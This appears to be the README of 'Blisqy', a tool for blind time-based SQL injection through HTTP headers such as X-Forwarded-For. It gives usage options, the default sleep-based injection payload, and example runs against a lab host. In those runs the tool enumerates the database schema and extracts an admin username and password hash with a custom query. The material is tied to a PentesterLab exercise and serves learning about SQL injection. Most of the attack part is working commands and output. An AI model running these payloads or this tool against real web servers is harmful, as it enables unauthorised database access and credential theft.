# Blisqy
A slow data siphon for MySQL/MariaDB using bitwise operation on printable ASCII characters, via a blind-SQL injection.

**PS:** Just another way to learn and understand SQL injections - how to manually hunt them down. What happens under the hood of SQLi tools.

## Usage
```bash
USAGE:
blisqy.py --server <Web Server> --port <port> --header <vulnerable header> --hvalue <header value> 
          --inject <point of injection>  --payload <custom sql payload> --dig <yes/no>

Options:
  -h, --help            show this help message and exit
  --server=WEBSERVER    Specify host (web server) IP
  --port=PORT           Specify port
  --header=VULNHEADER   Provide a vulnerable HTTP Header
  --hvalue=HEADERVALUE  Specify the value for the vulnerable header
  --inject=INJECTION    Provide where to inject Sqli payload
  --payload=PAYLOAD     Provide SQL statment/query to inject as payload
  --dig=DIGGER          Automatic Mysql-Schema enumeration (takes time!)
  --sleeptime=SLEEP     Sleep-Time for blind-SQLi query (default : 0.9)
```
## To Do :
* Intergrate an inteligent Fuzzer for hunting SQL injection vulnerabrity(ies) of HTTP Headers
* Support testing for URLs and WEB Forms fields.


## Assumptions :

At the moment, Blisqy assumes you have identified a potential Blind Sql injection vulnerability on a Webserver as demonstrated on [Pentester-Lab (From SQL Injection to Shell II)](https://pentesterlab.com/exercises/from_sqli_to_shell_II/course)

```bash
So point of injection BY DEFAULT is ---> 'or if((%s),sleep(0.9),0) and '1'='1

In other words, this argument is set.
--inject <point of injection> 
```

## Example :
**Vulnerable header is "X-Forwarded-For" and using --dig will enumerate the MySQL DB but takes time**

```bash
./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" --dig yes --sleeptime 0.9
[+] Getting Current Database : 
[-] photoblog


[+] Getting  number of TABLES ...
[-] 4


[+] Getting  all TABLE NAMES from Schema ...
[-] categories
[-] pictures
[-] stats
[-] users


[+] Getting  Columns and Rows from Schema ....
Preparing to get  all Columns in Table : categories .
=====================================================


[+] Getting   Number of Columns in a categories .
[-] 2
[+] Getting  all Column Names in Table : categories .
id
title
Number of Rows on Table : categories 
3
Preparing to get  all Columns in Table : pictures .
=====================================================


[+] Getting   Number of Columns in a pictures .
[-] 4
[+] Getting  all Column Names in Table : pictures .
cat
id
img
title
Number of Rows on Table : pictures 
3
Preparing to get  all Columns in Table : stats .
=====================================================


[+] Getting   Number of Columns in a stats .
[-] 2
[+] Getting  all Column Names in Table : stats .
count
ip
Number of Rows on Table : stats 
1
Preparing to get  all Columns in Table : users .
=====================================================


[+] Getting   Number of Columns in a users .
[-] 3
[+] Getting  all Column Names in Table : users .
id
login
password
Number of Rows on Table : users 
1

```
**With the above knowledge craft a niffty custom payload**
```bash
./blisqy.py --server 192.168.56.101 --port 80 --header X-Forwarded-For --hvalue "lol"  
            --payload "select concat(id,':',login,':',password) from users order by id desc limit 1"  
            --sleeptime 0.9

Extracting Data from ====> 192.168.56.101 : 80 
Current Payload : select concat(id,':',login,':',password) from users order by id desc limit 1
==================================================================

1:admin:8efe310f9ab3efeae8d410a8e0166eb2
```

**Vulnerable header is "X-Forwarded-For" and using --payload will run a custom SQL query on the MySQL DB**
```bash
./blisqy.py --server 192.168.56.101 --port 80 --header X-Forwarded-For --hvalue "lol"  
            --payload "select @@hostname" --sleeptime 0.8

Extracting Data from ====> 192.168.56.101 : 80 
Current Payload : select @@hostname
==================================================================
debian
```

## Very Imporntant
Always make sure you have fine tuned the `--sleeptime` to a value that resonates with your environment and network lantency.... Otherwise you'll be toased!

